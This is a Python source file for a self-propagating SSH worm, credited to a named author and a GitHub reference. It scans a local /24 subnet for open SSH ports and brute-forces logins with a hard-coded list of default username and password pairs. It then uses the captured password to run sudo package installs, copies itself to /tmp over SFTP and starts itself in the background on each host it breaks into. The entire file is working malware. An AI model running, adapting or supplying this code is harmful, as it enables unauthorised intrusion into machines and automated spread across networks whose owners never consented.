"""
Author: Brian Sung
Reference: https://github.com/luiscovar/worm-ssh
"""
import netifaces
import nmap
import paramiko
import socket
import os, time


# Username and password to try
CREDENTIALS = (
    ('root', 'toor'),
    ('root', '0000'),
    ('user', 'password'),
    ('user', '12345678'),
    ('brian', '2444666668888888'),
)

# Worm file location
WORM = os.path.join(os.sep, 'tmp', 'ssh_worm.py')

# Absolute path of current working directory
DIR = os.path.dirname(os.path.abspath(__file__))


def connect(host, username, password, ssh_client):
    try:
        ssh_client.connect(host, username=username, password=password)
        return 0
    except paramiko.ssh_exception.AuthenticationException:
        return 1
    except socket.error:
        return 2


def try_credentials(host):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for (username, password) in CREDENTIALS:
        result = connect(host, username, password, ssh_client)
        if result == 0:
            return ssh_client, password
        elif result == 1:  # wrong credential
            continue
        else:  # not able to connect
            break

    return None, None


def is_infected(ssh_client):
    """
    Check if the worm file is in the system or not.
    """
    try:
        sftp_client = ssh_client.open_sftp()
        sftp_client.stat(WORM)
        return True
    except:
        return False


def setup_env(ssh_client, password):
    """
    Install pip and required packages for worm.
    """
    stdin, _, _ = ssh_client.exec_command('sudo apt update', get_pty=True)
    stdin.write(password + '\n')  # for installing paramiko, apt needs to be updated
    stdin.flush()
    stdin, _, _ = ssh_client.exec_command('sudo apt install -y python-pip python-paramiko', get_pty=True)
    stdin.write(password + '\n')
    stdin.flush()
    ssh_client.exec_command('python -m pip install netifaces python-nmap')


def attack(ssh_client, password):
    """
    Replicate the worm to the target host and execute it in background.
    """
    setup_env(ssh_client, password)
    sftp_client = ssh_client.open_sftp()
    sftp_client.put(os.path.join(DIR, 'ssh_worm.py'), WORM)
    ssh_client.exec_command('chmod a+x ' + WORM)  # enable execution permission for user
    ssh_client.exec_command('python ' + WORM + ' &')
    ssh_client.close()


def get_my_ip():
    """
    Check current host network interfaces for address.
    """
    network_interfaces = netifaces.interfaces()
    ip_addr = None

    for netFace in network_interfaces:
            try:
                addr = netifaces.ifaddresses(netFace)[2][0]['addr']
            except:  # Some KeyError exceptions here
                continue

            if addr != '127.0.0.1':
                    ip_addr = addr
                    break

    return ip_addr


def get_hosts():
    """
    Scan through the local network to find host with open ssh port (22).
    """
    port_scanner = nmap.PortScanner()
    port_scanner.scan('192.168.2.1/24', arguments='-p -22 --open')  # Explore only sharing network
    host_info = port_scanner.all_hosts()
    live_hosts = []
    my_ip = get_my_ip()

    for host in host_info:
        if port_scanner[host].state() == 'up' and host != my_ip:
            live_hosts.append(host)

    return live_hosts


if __name__ == '__main__':
    hosts = get_hosts()
    print hosts

    for host in hosts:
        ssh_client, password = try_credentials(host)
        if ssh_client and not is_infected(ssh_client):
                attack(ssh_client, password)
